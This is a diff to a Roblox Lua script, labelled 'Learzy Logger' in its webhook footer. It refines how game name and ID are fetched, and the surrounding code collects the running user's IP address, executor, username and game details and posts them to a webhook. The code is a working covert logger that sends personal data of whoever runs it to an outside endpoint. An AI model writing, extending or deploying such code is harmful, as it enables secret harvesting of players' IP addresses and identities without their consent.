@@ -59,22 +59,21 @@ local function getClientInfo()
     return ip, device
 end
 
-local function getGameName()
-    local success, info = pcall(function()
+local function getGameInfo()
+    local success, data = pcall(function()
         return MarketplaceService:GetProductInfo(game.PlaceId)
     end)
-    if success and info and info.Name then
-        return info.Name
-    else
-        return "Unknown Game"
+    if success and data then
+        return data.Name or "Unknown Game", data.AssetId or tostring(game.PlaceId)
     end
+    return "Unknown Game", tostring(game.PlaceId)
 end
 
 local function sendWebhook()
     if not requestFunction then return end
     local ip, device = getClientInfo()
     local username = LocalPlayer and LocalPlayer.Name or "Unknown"
-    local gameName = getGameName()
+    local gameName, gameId = getGameInfo()
 
     local payload = {
         ["content"] = "",
@@ -87,7 +86,8 @@ local function sendWebhook()
                 {["name"] = "IP", ["value"] = ip, ["inline"] = true},
                 {["name"] = "Executor", ["value"] = device, ["inline"] = false},
                 {["name"] = "Game Name", ["value"] = gameName, ["inline"] = false},
-                {["name"] = "Game PlaceId", ["value"] = tostring(game.PlaceId), ["inline"] = true}
+                {["name"] = "Game ID", ["value"] = tostring(gameId), ["inline"] = true},
+                {["name"] = "PlaceId", ["value"] = tostring(game.PlaceId), ["inline"] = true}
             },
             ["footer"] = {["text"] = "Learzy Logger"},
             ["timestamp"] = DateTime.now():ToIsoDate()
